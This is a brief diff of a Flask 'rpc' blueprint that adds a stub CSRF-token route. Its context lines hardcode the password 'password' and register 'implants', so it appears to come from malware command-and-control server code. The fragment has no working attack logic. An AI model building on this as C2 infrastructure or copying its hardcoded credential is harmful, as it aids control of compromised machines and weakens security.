@@ -9,6 +9,12 @@ rpc = Blueprint("rpc", __name__)
 
 password = "password"
 
+@rpc.route("/get_csrf", methods=["GET"])
+def assign_csrf():
+    print(f'Generating a CSRF Token')
+    return "Here is your token"
+    pass
+
 @rpc.route("/register", methods=["POST"])
 def handle_register():
     print(f'REGISTERING A NEW IMPLANT')
